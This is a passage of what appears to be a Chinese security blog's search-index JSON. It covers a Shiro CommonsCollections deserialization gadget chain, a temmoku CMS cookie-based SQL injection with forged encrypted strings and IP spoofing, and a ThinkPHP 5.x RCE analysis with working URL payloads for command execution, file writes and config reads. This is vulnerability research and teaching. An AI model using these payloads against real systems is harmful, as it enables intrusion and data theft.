\u6784\u9020\u5e26\u6709evil class bytes\u7684TemplatesImpl\n// \u6784\u9020InvokerTransformer\uff0c\u586b\u5145\u65e0\u5bb3\u7684toString\u51fd\u6570\nfinal InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]);\n\nfinal Map innerMap = new HashMap();\n// \u6784\u9020LazyMap\u7684factory\u4e3a\u524d\u9762\u7684InvokerTransformer\nfinal Map lazyMap = LazyMap.decorate(innerMap, transformer);\n// \u586b\u5145TiedMapEntry\u7684map\uff08lazyMap\uff09\u548ckey\uff08TemplatesImpl\uff09\nTiedMapEntry entry = new TiedMapEntry(lazyMap, templates);\n\nHashSet map = new HashSet(1);\nmap.add(\"foo\");\n// \u4e0b\u8ff0\u4ee3\u7801\u5c06entry\u586b\u5145\u5230HashSet\u7684node\u7684key\u4e0a\uff0c\u53ef\u4ee5\u4f7f\u5f97HashSet\u5728put\u7684\u65f6\u5019\u8c03\u7528TiedMapEntry\u7684hashCode\u51fd\u6570\nField f = null;\ntry {\n  f = HashSet.class.getDeclaredField(\"map\");\n} catch (NoSuchFieldException e) {\n  f = HashSet.class.getDeclaredField(\"backingMap\");\n}\nReflections.setAccessible(f);\nHashMap innimpl = null;\ninnimpl = (HashMap) f.get(map);\n\nField f2 = null;\ntry {\n  f2 = HashMap.class.getDeclaredField(\"table\");\n} catch (NoSuchFieldException e) {\n  f2 = HashMap.class.getDeclaredField(\"elementData\");\n}\nReflections.setAccessible(f2);\nObject[] array = new Object[0];\narray = (Object[]) f2.get(innimpl);\nObject node = array[0];\nif(node == null){\n  node = array[1];\n}\n\nField keyField = null;\ntry{\n  keyField = node.getClass().getDeclaredField(\"key\");\n}catch(Exception e){\n  keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");\n}\nReflections.setAccessible(keyField);\nkeyField.set(node, entry);\n// \u5c06\u6700\u7ec8\u7684\u89e6\u53d1\u51fd\u6570newTransformer\u88c5\u8f7d\u5230InvokerTransformer\u4e0a\nReflections.setFieldValue(transformer, \"iMethodName\", \"newTransformer\");\n\nreturn map;\n</code></pre> <p>\u8fd9\u91cc\u4e0d\u5bf9\u6e90\u7801\u8fdb\u884c\u8bb2\u89e3\u4e86\uff0c\u90fd\u5199\u5728\u4e86\u6ce8\u91ca\u91cc\u3002</p> <p>\u8fd9\u91cc\u6574\u7406\u4e00\u4e0b\u8fd9\u6761\u94fe\u7684\u8c03\u7528\u8fc7\u7a0b</p> <pre><code>java.util.HashSet.readObject()\n-&gt; java.util.HashMap.put()\n-&gt; java.util.HashMap.hash()\n    -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()\n    -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()\n        -&gt; org.apache.commons.collections.map.LazyMap.get()\n        -&gt; org.apache.commons.collections.functors.InvokerTransformer.transform()\n            -&gt; java.lang.reflect.Method.invoke()\n      ... templates gadgets ...\n      -&gt; java.lang.Runtime.exec()\n</code></pre>","tags":["Java"]},{"location":"blog/2019/study-java-deserialized-shiro-1-2-4-20191110/#0x05","title":"0x05 \u603b\u7ed3","text":"<p>\u5728\u7ecf\u8fc7\u5bf9<code>CommonsCollections</code>\u7cfb\u5217\u7684\u5229\u7528\u94fe\u8fdb\u884c\u5206\u6790\u540e\uff0c\u5728shiro\u8fd9\u4e2a\u95ee\u9898\u4e0a\uff0c\u8fdb\u884c\u4e86\u5b9e\u6218\uff0c\u89e3\u51b3\u4e86tomcat\u4e0b\u65e0\u6cd5\u5229\u7528shiro\u539f\u751f\u7684<code>commons-collections:3.2.1</code>\u8fd9\u4e2a\u95ee\u9898\u3002</p> <p>\u6700\u540e\uff0c\u5728\u6700\u8fd1\u7684shiro-721\u5229\u7528\u4e0a\uff0c\u8fd9\u4e2a\u5229\u7528\u94fe\u5e0c\u671b\u53ef\u4ee5\u5e2e\u52a9\u5230\u5927\u5bb6</p> <p></p> <p>Happy Hacking XD</p>","tags":["Java"]},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/","title":"temmoku home\u7248 t1.15 \u524d\u53f0sqli","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/#0x00","title":"0x00","text":"<p>\u5f88\u4e45\u6ca1\u6709\u5ba1\u8ba1\u4e86\uff0c\u627e\u4e86\u4e2a\u7b80\u5355\u7684cms\u5ba1\u8ba1 \u8fd9\u6b21\u627e\u7684\u662ftemmoku\uff0c\u4ed6\u4fee\u6539\u4e86thinkphp\u4f5c\u4e3a\u4ed6\u7684\u5e95\u5c42\u6846\u67b6\u3002 \u4ee3\u7801\u5199\u7684\u5f88\u96be\u53d7\uff0c\u5199\u51fa\u6765\u7684\u754c\u9762\u4e5f\u5f88\u96be\u53d7\uff0c\u6240\u4ee5\u627e\u4e86\u4e2a\u6ce8\u5165\u5c31\u4e0d\u60f3\u770b\u4e86\uff0c\u8bb0\u5f55\u4e00\u4e0b\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/#0x01","title":"0x01 \u524d\u53f0\u6ce8\u5165","text":"<p>\u8fd9\u5957cms\uff0c\u6bcf\u4e2a\u63a7\u5236\u5668\u90fd\u7ee7\u627f\u4e86<code>temmoku/controller.php</code>\uff0c\u5176\u4e2dcontroller\u6784\u9020\u51fd\u6570\u505a\u4e86\u76f8\u5173\u6743\u9650\u63a7\u5236 \u627e\u5230<code>temmoku/controller.php</code>\uff0c\u5b9a\u4f4d\u5230__construct\u51fd\u6570</p> <p><pre><code>function __construct()\n{\n $this-&gt;_view     =   new view();\n    if(!cookie::get('USER_First_Visit')){\n      cookie::set('USER_First_Visit',$_SERVER['REQUEST_TIME_FLOAT']);\n    }\n$lock=APP_PATH.'conf/install.lock';\n  if(is_file($lock)){\n    if('admin'!=MODULE &amp;&amp; 'user'!=MODULE){\n      hook_listen('index_power_begin');\n    }\n    //\u9a8c\u8bc1\u666e\u901a\u4f1a\u5458\u72b6\u6001\n    $this-&gt;User_Check();// \u6ce8\u5165\n\n    if('admin'!=MODULE &amp;&amp; 'user'!=MODULE){\n      hook_listen('index_power_end');\n    }\n\n  }\n}\n</code></pre> \u6ce8\u610f\u5230\u7b2c13\u884c\uff0c\u8c03\u7528\u4e86User_Check\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5b8c\u6210\u4e86\u4ececookie\u4e2d\u83b7\u53d6\u5230\u767b\u9646\u540e\u7684\u52a0\u5bc6\u5b57\u4e32\uff0c\u89e3\u5bc6\u540e\u518d\u67e5\u8be2\u7684\u64cd\u4f5c\u3002 <pre><code>private function User_Check(){\n      $ORDINARY_MEMBER=cookie::get('ORDINARY_MEMBER');\n      if($ORDINARY_MEMBER){\n      if(json_encode($ORDINARY_MEMBER)){\n        $ORDINARY_MEMBER=decode($ORDINARY_MEMBER);\n        list($uid,$password,$onlineip)=$r =explode(' ',$ORDINARY_MEMBER);\n        if(!intval($uid) || !$password || C('ONLINEIP') != $onlineip || !$onlineip){\n          cookie::del('ORDINARY_MEMBER');\n          return;\n        }\n        $data = (new lib\\user)-&gt;Cookie_Login($uid,$password);// TODO \u4f2a\u9020cookie \u5bf9password\u505a\u6570\u636e\u6ce8\u5165\n        if('0'===$data['code']){\n          $data['UserDB']['thumb'] ? $data['UserDB']['thumb']=get_img_url($data['UserDB']['thumb']) : $data['UserDB']['thumb']='/public/global/images/default.png';\n          C('MYDB',$data['UserDB']);\n          $group=C('USER_GROUP.'.$data['UserDB']['groupid']);\n          $group['setting']=unserialize($group['setting']);\n          C('MYGROUP',$group);\n        }else{\n          cookie::del('ORDINARY_MEMBER');\n          return;\n        }\n      }else{\n        cookie::del('ORDINARY_MEMBER');\n        return;\n      }\n    }\n}\n</code></pre> \u4ececookie\u4e2d\u83b7\u5f97ORDINARY_MEMBER\u76f8\u5173\u7684cookie\u5185\u5bb9\uff0c\u5e76\u4ea4\u7531decode\u89e3\u5bc6\uff0c\u89e3\u5bc6\u51fauid,password,onlineip\uff0c\u76f4\u63a5\u5e26\u5165\u5230Cookie_Login\u51fd\u6570\uff0c\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u51fd\u6570\uff0c\u7b49\u4f1a\u518d\u8bb2\u5982\u4f55\u6784\u9020\u52a0\u5bc6\u4e32 <pre><code>public function Cookie_Login($uid,$password){\n    $UserDB=$this-&gt;select('*')-&gt;from(jab.\"user\")-&gt;where(\"uid='$uid' AND password='$password'\")-&gt;row();\n    if($UserDB){\n      return array(\"code\"=&gt;'0','text'=&gt;\"\u767b\u5f55\u6210\u529f\",'UserDB'=&gt;$UserDB);\n    }else{\n      return array(\"code\"=&gt;'21','text'=&gt;\"\u5bc6\u7801\u9519\u8bef\");\n    }\n}\n</code></pre> \u53ef\u4ee5\u770b\u5230\u51fd\u6570\u5185\u7b2c\u4e00\u53e5\uff0c\u8fdb\u884c\u4e86\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u719f\u6089thinkphp\u7684\u540c\u5b66\u80af\u5b9a\u77e5\u9053where\u51fd\u6570\u62fc\u63a5\u53c2\u6570\u540c\u6837\u80fd\u9020\u6210\u6ce8\u5165\uff0c\u90a3\u4e48\u95ee\u9898\u5c31\u662f\u5982\u4f55\u6784\u9020\u51fapassword\u6765\u8fdb\u884c\u6ce8\u5165\u4e86\uff0c\u56de\u5230\u4e0a\u9762\u63d0\u5230\u7684decode\u51fd\u6570\uff0c\u6765\u770b\u4e00\u4e0b\u51fd\u6570\u5185\u5bb9 <pre><code>    /**\n     * \u89e3\u5bc6\u51fd\u6570\n     * @param string $txt \u9700\u8981\u89e3\u5bc6\u7684\u5b57\u7b26\u4e32\n     * @param string $key \u5bc6\u5319\n     * @return string \u5b57\u7b26\u4e32\u7c7b\u578b\u7684\u8fd4\u56de\u7ed3\u679c\n     */\nfunction decode($txt, $key = '', $ttl = 0){\n    if (empty($txt)) return $txt;\n    if (empty($key)) $key = md5(C('MD5'));\n    // ... \u540e\u9762\u7684\u76f8\u5173\u6570\u5b66\u64cd\u4f5c\u65e0\u5173\u7d27\u8981\n}\n</code></pre> \u6ce8\u610f\u5230\u5728User_Check\u51fd\u6570\u91cc\u8c03\u7528decode\u65f6\uff0c\u5e76\u6ca1\u6709\u6307\u5b9akey\uff0c\u90a3\u4e48\u9ed8\u8ba4\u5c31\u662f\u53d6\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684MD5\uff0c\u5176\u503c\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u6240\u4ee5\u77e5\u9053\u4e86key\u4ee5\u53ca\u5bf9\u5e94\u7684\u52a0\u5bc6\u51fd\u6570\uff0c\u6211\u4eec\u5c31\u80fd\u81ea\u5df1\u6784\u9020\u76f8\u5173\u5185\u5bb9\u3002 \u5176\u4e2d\u8fd8\u6709\u4e00\u4e2a\u8981\u6ce8\u610f\u7684\u5730\u65b9\u662f\uff0c\u6211\u4eec\u9700\u8981\u540c\u65f6\u6784\u9020cookie\u7684\u952e\u5185\u5bb9\u548conlineip\uff0c\u53ea\u6709\u5f53cookie\u4e2d\u540d\u5b57\u5bf9\u65f6\u624d\u80fd\u53d6\u5230\uff0c\u53ea\u6709\u5f53onlineip\u5bf9\u65f6\u624d\u80fd\u8fdb\u884c\u6570\u636e\u5e93\u67e5\u8be2\u3002 \u5148\u6765\u770b\u7b2c\u4e00\u4e2a\uff0c\u6784\u9020cookie\u540d \u5b9a\u4f4d<code>temmoku/lib/cookie.php</code></p> <p><pre><code>public static function get($key){\n  $key=C('cookie_is_en')=='1' ? 'temmoku_'.md5(C('MD5').\"_\".$key) : 'temmoku_'.$key;\n  return empty($_COOKIE[$key]) ? 0 : $_COOKIE[$key];\n}\n</code></pre> \u9ed8\u8ba4cookie_is_en\u4e3a1\uff0c\u6240\u4ee5\u662f\u52a0\u5bc6\u7684\uff0ccookie\u7684\u540d\u5b57\u4e3a<code>temmoku_+md5(\"_ORDINARY_MEMBER\")</code> \u56e0\u4e3aMD5\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u80fd\u63a8\u51facookie\u540d\u4e3a<code>temmoku_c3daef9b5af4ca25121457287fd0c2ac</code> \u5176\u6b21\u6211\u4eec\u9700\u8981\u6784\u9020onlineip,\u6765\u770b\u770b\u8fd9\u4e2aonlineip\u662f\u600e\u4e48\u83b7\u53d6\u7684 \u5b9a\u4f4d<code>temmoku/app.php</code></p> <p><pre><code>private static function default_config(){\n  // ...\n  C('onlineip',getRealIp());// TODO \u53ef\u4f2a\u9020Ip\n  define('onlineip', getRealIp());\n  // ...\n}\n</code></pre> \u7ee7\u7eed\u5411\u4e0b <pre><code>function getRealIp(){\n  $ip=false;\n  if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){\n    $ip = $_SERVER[\"HTTP_CLIENT_IP\"];\n  }\n  if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n      $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']);\n    if ($ip) { array_unshift($ips, $ip); $ip = FALSE; }\n    for ($i = 0; $i &lt; count($ips); $i++) {\n        if (!preg_match (\"/^(10\u2502172.16\u2502192.168)./\", $ips[$i])) {\n            $ip = $ips[$i];\n            break;\n        }\n    }\n  }\n  return ($ip ? $ip : $_SERVER['REMOTE_ADDR']);\n}\n</code></pre> \u53ef\u4ee5\u770b\u51fa\u7528Client-Ip\u5c31\u80fd\u4f2a\u9020\uff0c\u90a3\u4e48\u73b0\u5728\u95ee\u9898\u90fd\u89e3\u51b3\u4e86\uff0c\u53ef\u4ee5\u6784\u9020\u52a0\u5bc6\u4e32\u4e86</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/#0x02","title":"0x02 \u6784\u9020\u52a0\u5bc6\u4e32","text":"<p><pre><code>&lt;?php\n/**\n * Created by PhpStorm.\n * User: wh1t3P1g\n * Date: 2019/2/21\n * Time: 19:48\n */\n\nfunction decode($txt, $key = '', $ttl = 0){\n    ...\n}\n\nfunction encode($txt, $key = ''){\n    ...\n}\n\necho encode('1550750916.778 \\' 127.0.0.1');\n</code></pre> \u5f97\u5230\u52a0\u5bc6\u4e32<code>iBuikbGflt4lk4LiZ747G7NBIm9uPlLKikooVtsqagnfQIk1NZI0-rW</code>\uff0c\u76f4\u63a5\u52a0\u5728cookie\u91cc\u5c31\u80fd\u9020\u6210\u7cfb\u7edf\u51fa\u73b0\u6570\u636e\u5e93\u9519\u8bef</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/temmoku-t1-15-sqli-20190221/#0x03","title":"0x03 \u603b\u7ed3","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u6bd4\u8f83\u7ecf\u5178\u7684\u95ee\u9898\uff0c\u7528\u4e86\u52a0\u5bc6\u540e\uff0c\u5f00\u53d1\u8005\u9ed8\u8ba4\u8ba4\u4e3a\u89e3\u5bc6\u540e\u7684\u5b57\u7b26\u4e32\u662f\u5b89\u5168\u7684\uff0c\u76f4\u63a5\u62fc\u63a5\u5230\u6570\u636e\u5e93\u64cd\u4f5c\u4e0a\u5bfc\u81f4\u7684\u6ce8\u5165\u3002</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/","title":"thinkphp v5.x App.php s\u53c2\u6570RCE","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_1","title":"\u6982\u8ff0","text":"<p>\u653e\u5047\u4e86\uff0c\u5bf9thinkphp\u7684\u51e0\u4e2aRCE\u505a\u4e00\u4e0b\u5206\u6790\uff0c\u8bb0\u5f55\u4e00\u4e0bXD</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#thinkphp-v50x","title":"thinkphp v5.0.x","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_2","title":"\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f","text":"<p>\u6f0f\u6d1e\u7248\u672c\uff1a&lt;= 5.0.22 \u8865\u4e01\uff1a\u7248\u672c\u66f4\u65b0 \u00b7 top-think/framework@4cbc0b5 \u00b7 GitHub \u95ee\u9898\u70b9\uff1alibrary/think/App.php</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_3","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#thinkphpurl","title":"\u5173\u4e8ethinkphp\u7684url\u89e3\u6790\u65b9\u5f0f","text":"<p>THINKPHP\u652f\u6301\u4f7f\u7528PATHINFO\u7684\u65b9\u5f0f\u6765\u8bbf\u95ee\u5177\u4f53\u7684\u6a21\u5757\u3001\u7c7b\u3001\u65b9\u6cd5\uff0c\u5982<code>index.php/module/controller/action</code> \u5bf9\u4e8e\u4e0d\u652f\u6301PATHINFO\u7684\u670d\u52a1\u5668\uff0cTHINKPHP\u63d0\u4f9b\u4e86\u517c\u5bb9\u6a21\u5f0f<code>?s=/module/controller/action</code>\u7684\u65b9\u5f0f\u6765\u8bbf\u95ee \u800c\u8fd9\u6b21\u7684\u6f0f\u6d1e\u6210\u56e0\u5c31\u662f\u5728\u4e8e\u517c\u5bb9\u6a21\u5f0f\u5904\u7406\u65f6\u5b58\u5728\u7684\u95ee\u9898\u3002 \u9996\u5148\u770b <code>thinkphp/library/think/Request.php</code>\u7684<code>pathinfo</code>\u51fd\u6570</p> <p><pre><code>public function pathinfo()\n{\n    if (is_null($this-&gt;pathinfo)) {\n        if (isset($_GET[Config::get('var_pathinfo')])) {\n            // \u5224\u65adURL\u91cc\u9762\u662f\u5426\u6709\u517c\u5bb9\u6a21\u5f0f\u53c2\u6570\n            $_SERVER['PATH_INFO'] = $_GET[Config::get('var_pathinfo')];\n            unset($_GET[Config::get('var_pathinfo')]);\n        } elseif (IS_CLI) {\n            // CLI\u6a21\u5f0f\u4e0b index.php module/controller/action/params/...\n            $_SERVER['PATH_INFO'] = isset($_SERVER['argv'][1]) ? $_SERVER['argv'][1] : '';\n        }\n\n        // \u5206\u6790PATHINFO\u4fe1\u606f\n        ...\n        $this-&gt;pathinfo = empty($_SERVER['PATH_INFO']) ? '/' : ltrim($_SERVER['PATH_INFO'], '/');\n    }\n    return $this-&gt;pathinfo;\n}\n</code></pre> \u5f53GET\u8bf7\u6c42\u4e2d\u5e26\u6709s\u53c2\u6570(config\u4e2d\u9ed8\u8ba4var_pathinfo\u4e3as)\uff0c\u5c06pathinfo\u8bbe\u7f6e\u4e3as\u7684\u53c2\u6570\u503c \u6709\u4e86pathinfo\u503c\uff0c\u6211\u4eec\u518d\u627e\u5230\u5177\u4f53\u7684\u89e3\u6790url\u7684\u51fd\u6570\uff0c<code>thinkphp/library/think/Route.php</code>\u7684<code>parseUrl</code>\u51fd\u6570 <pre><code>public static function parseUrl($url, $depr = '/', $autoSearch = false)\n{\n    if (isset(self::$bind['module'])) {\n        $bind = str_replace('/', $depr, self::$bind['module']);\n        // \u5982\u679c\u6709\u6a21\u5757/\u63a7\u5236\u5668\u7ed1\u5b9a\n        $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr);\n    }\n    $url              = str_replace($depr, '|', $url);\n    list($path, $var) = self::parseUrlPath($url);\n    $route            = [null, null, null];\n    // ...\n}\n</code></pre> \u5176\u4e2dparseUrl\u51fd\u6570\u7684<code>$url</code>\u4e3a\u4e0a\u9762\u62ff\u5230\u7684pathinfo\uff0c<code>$depr</code>\u4e3a\u9ed8\u8ba4\u7684\u5206\u5272\u7b26 \u9996\u5148\u5bf9<code>$url</code>\u66ff\u6362\u5206\u5272\u7b26\u4e3a<code>|</code>\uff0c\u518d\u8f93\u5165\u5230<code>parseUrlPath</code>\u51fd\u6570(\u6839\u636e<code>/</code>\u5206\u5272)\uff0c\u8be5\u51fd\u6570\u5bf9pathinfo\u8fdb\u884c\u5206\u5272\uff0c\u4ea7\u751f<code>module</code>\u3001<code>controller</code>\u3001<code>action</code> \u90a3\u4e48\u73b0\u5728\u6765\u770brce\u7684Poc<code>?s=/index/\\think\\app/invokefunction</code>=&gt;<code>[module:index,controller:\\think\\app,action:invokefunction]</code> \u5176\u4e2dcontroller=&gt;\\think\\app\uff0c\u662fphp\u547d\u540d\u7a7a\u95f4\u7684\u8868\u793a\u65b9\u5f0f\uff0c\\think\\app\u5b9e\u9645\u8c03\u7528library/think/App.php\uff0c\u540e\u9762\u7684action\u5b9e\u9645\u8c03\u7528\u7684App.php\u4e2d\u7684invokefunction\u51fd\u6570</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_4","title":"\u6f0f\u6d1e\u6210\u56e0\u70b9","text":"<p>\u4e0a\u9762\u5206\u6790\u4e86thinkphp\u7684\u517c\u5bb9\u6a21\u5f0f\u662f\u5982\u4f55\u5904\u7406s\u53c2\u6570\u7684\uff0c\u5e76\u4e14\u5904\u7406\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\u5c31\u662f\u53ef\u4ee5\u4f2a\u9020controller\uff0c\u5bfc\u81f4\u5b9e\u9645\u8c03\u7528\u4e3a\u5176\u4ed6\u7684\u7c7b\u548c\u51fd\u6570 \u770b\u4e00\u4e0b\u62ff\u5230module\u3001controller\u3001action\u540e\u7cfb\u7edf\u7684\u5904\u7406 thinkphp/library/think/App.php \u7684 module\u51fd\u6570 <pre><code>public static function module($result, $config, $convert = null)\n{\n    if (is_string($result)) {\n        $result = explode('/', $result);\n    }\n\n    $request = Request::instance();\n\n    ...\n\n    // \u8bbe\u7f6e\u9ed8\u8ba4\u8fc7\u6ee4\u673a\u5236\n    $request-&gt;filter($config['default_filter']);\n\n    ...\n\n    try {\n        $instance = Loader::controller(// \u5b9e\u4f8b\u5316controller\u7c7b\n            $controller,\n            $config['url_controller_layer'],\n            $config['controller_suffix'],\n            $config['empty_controller']\n        );\n    } catch (ClassNotFoundException $e) {\n        throw new HttpException(404, 'controller not exists:' . $e-&gt;getClass());\n    }\n\n    // \u83b7\u53d6\u5f53\u524d\u64cd\u4f5c\u540d\n    $action = $actionName . $config['action_suffix'];\n\n    $vars = [];\n    if (is_callable([$instance, $action])) {\n        // \u6267\u884c\u64cd\u4f5c\u65b9\u6cd5\n        $call = [$instance, $action];\n        // \u4e25\u683c\u83b7\u53d6\u5f53\u524d\u64cd\u4f5c\u65b9\u6cd5\u540d\n        $reflect    = new \\ReflectionMethod($instance, $action);\n        $methodName = $reflect-&gt;getName();\n        $suffix     = $config['action_suffix'];\n        $actionName = $suffix ? substr($methodName, 0, -strlen($suffix)) : $methodName;\n        $request-&gt;action($actionName);\n\n    } elseif (is_callable([$instance, '_empty'])) {\n        // \u7a7a\u64cd\u4f5c\n        $call = [$instance, '_empty'];\n        $vars = [$actionName];\n    } else {\n        // \u64cd\u4f5c\u4e0d\u5b58\u5728\n        throw new HttpException(404, 'method not exists:' . get_class($instance) . '-&gt;' . $action . '()');\n    }\n\n    Hook::listen('action_begin', $call);\n\n    return self::invokeMethod($call, $vars);// \u8c03\u7528\u51fd\u6570\n}\n</code></pre> \u62ff\u5230\u5b9e\u4f8b\u5316\u540e\u7684\u5bf9\u8c61\u548c\u65b9\u6cd5\uff0c\u52a8\u6001\u8c03\u7528<code>invokeMethod</code> <pre><code>public static function invokeMethod($method, $vars = [])\n{\n    if (is_array($method)) {\n        $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);\n        $reflect = new \\ReflectionMethod($class, $method[1]);\n    } else {\n        // \u9759\u6001\u65b9\u6cd5\n        $reflect = new \\ReflectionMethod($method);\n    }\n\n    $args = self::bindParams($reflect, $vars);// \u83b7\u53d6\u53c2\u6570\u5185\u5bb9 \u8fd9\u91cc\u83b7\u53d6\u5230\u53c2\u6570\u7528\u505amethod\u7684\u53c2\u6570\u8f93\u5165\n\n    self::$debug &amp;&amp; Log::record('[ RUN ] ' . $reflect-&gt;class . '-&gt;' . $reflect-&gt;name . '[ ' . $reflect-&gt;getFileName() . ' ]', 'info');\n\n    return $reflect-&gt;invokeArgs(isset($class) ? $class : null, $args);\n}\n</code></pre> \u8fd9\u91cc\u4f7f\u7528bindParams\u51fd\u6570\u4eceget\u6216post\u4e2d\u83b7\u53d6\u5230\u5bf9\u5e94\u7684\u5185\u5bb9\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u505a\u53c2\u6570\u5d4c\u5165\u65f6\uff0c\u9700\u8981\u4ee5\u51fd\u6570\u7684\u53c2\u6570\u540d\u4e3a\u952e \u5982invokeFunction\u7684\u53c2\u6570\u4e3a<code>$function</code>\u3001<code>$vars</code>\uff0c\u90a3\u4e48\u5728\u53c2\u6570\u4e2d\u5c31\u9700\u8981\u4ee5<code>function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxx</code> \u5373poc\u7684\u540e\u534a\u90e8\u5206<code>function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</code> \u6240\u4ee5\u8c03\u7528\u94fe\u73b0\u5728\u53d8\u6210\u4e86   1. \u52a8\u6001\u8c03\u7528\\think\\app invokeFunction\u51fd\u6570   2. \u63d0\u4f9bfunction=call_user_func_array\u4f5c\u4e3ainvokeFunction\u52a8\u6001\u8c03\u7528\u7684\u53c2\u6570\uff0c\u6240\u4ee5\u4e0b\u4e00\u6b65\u8c03\u7528call_user_func_array\u51fd\u6570   3. call_user_func_array\u7684\u53c2\u6570\u4e3asystem\u51fd\u6570\uff0csystem\u51fd\u6570\u7684\u53c2\u6570\u4e3als -l\uff0c\u6240\u4ee5\u8fd9\u91cc\u7528\u4e862\u7ef4\u6570\u7ec4</p> <p> \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53d1\u6563\u4e00\u4e0b\u601d\u7ef4\uff0c\u6211\u4eec\u5176\u5b9e\u4e0d\u5355\u5355\u53ef\u4ee5\u8c03\u7528\\think\\app\u8fd9\u4e2a\u7c7b\uff0c\u5982\u679c\u5176\u4ed6\u7684\u7c7b\u53ef\u4ee5\u4efb\u610f\u8c03\u7528\u5176\u4ed6\u51fd\u6570\uff0c\u6216\u8005\u662f\u8c03\u7528\u547d\u4ee4\u6267\u884c\u51fd\u6570\uff0c\u540c\u6837\u5177\u6709\u5371\u5bb3\u6027 \u5982\u4efb\u610f\u547d\u4ee4\u6267\u884c <code>?s=/index/think\\view\\driver\\php/display&amp;content=&lt;?php%20phpinfo();</code> \u4efb\u610f\u6587\u4ef6\u5199\u5165\uff0c\u751f\u6210\u5728index.php\u540c\u4e00\u7ea7\u76ee\u5f55 <code>?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code> \u83b7\u53d6\u914d\u7f6e\u4fe1\u606f <code>?s=index/\\think\\config/get&amp;name=database.username</code></p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#thinkphp-v51x","title":"thinkphp v5.1.x","text":"","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_5","title":"\u7248\u672c\u4fe1\u606f","text":"<p>\u7248\u672c\uff1a&lt;= v5.1.30 \u8865\u4e01\u4fe1\u606f\uff1a\u4fee\u6b63\u63a7\u5236\u5668\u8c03\u7528 \u00b7 top-think/framework@802f284 \u00b7 GitHub \u6f0f\u6d1e\u70b9\uff1athinkphp/library/think/route/dispatch/Module.php</p>","tags":["\u6f0f\u6d1e\u5206\u6790"]},{"location":"blog/2019/thinkphp-v5.x-App.php-rce/#_6","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u539f\u7406\u540cv5.0.x\u7248\u672c\u7c7b\u4f3c\uff0c\u4e5f\u662f\u7531\u4e8es\u53c2\u6570\u5e26\u5165\u7684\u8def\u5f84\u89e3\u6790\u5b58\u5728\u5b89\u5168\u95ee\u9898\u5bfc\u81f4\u7684\u4efb\u610f\u4ee3\u7801\u6267\u884c \u5148\u770bApp::run() <pre><code>public function run()\n{\n    try {\n        // \u521d\u59cb\u5316\u5e94\u7528\n        $this-&gt;initialize();\n\n        ...\n\n        $dispatch = $this-&gt;dispatch;\n\n        if (empty($dispatch)) {\n            // \u8def\u7531\u68c0\u6d4b\n            $dispatch = $this-&gt;routeCheck()-&gt;init();// \u5904\u7406module\u3001controller\u3001action\n        }\n\n        // \u8bb0\u5f55\u5f53\u524d\u8c03\u5ea6\u4fe1\u606f\n        $this-&gt;request-&gt;dispatch($dispatch);\n\n        ...\n\n    } catch (HttpResponseException $exception) {\n        $dispatch = null;\n        $data     = $exception-&gt;getResponse();\n    }\n\n    $this-&gt;middleware-&gt;add(function (Request $request, $next) use ($dispatch, $data) {\n        return is_null($data) ? $dispatch-&gt;run() : $data;\n    });\n\n    $response = $this-&gt;middleware-&gt;dispatch($this-&gt;request);// \u52a8\u6001\u8c03\u7528controller\u3001action\n\n    ...\n\n    return $response;\n}\n</code></pre> 